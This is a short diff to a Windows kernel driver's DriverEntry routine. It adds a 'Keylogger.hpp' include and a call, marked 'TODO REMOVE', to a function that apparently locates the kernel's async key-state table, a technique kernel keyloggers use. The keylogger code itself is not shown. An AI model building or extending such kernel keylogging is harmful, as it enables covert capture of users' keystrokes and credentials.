@@ -5,6 +5,7 @@
 #include "Globals.hpp"
 #include "IOCTLS.hpp"
 #include "FileUtils.hpp"
+#include "Keylogger.hpp"
 
 // --------------------------------------------------------------------------------------------------------
 
@@ -182,6 +183,9 @@ DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
     {
         return NtStatus;
     }
+
+    // TODO REMOVE
+    BeGetGafAsyncKeyStateAddress();
 
     NtStatus = IoCreateSymbolicLink(&usDosDeviceName, &usDriverName); // Symbolic Link simply maps a DOS Device Name to an NT Device Name.
 
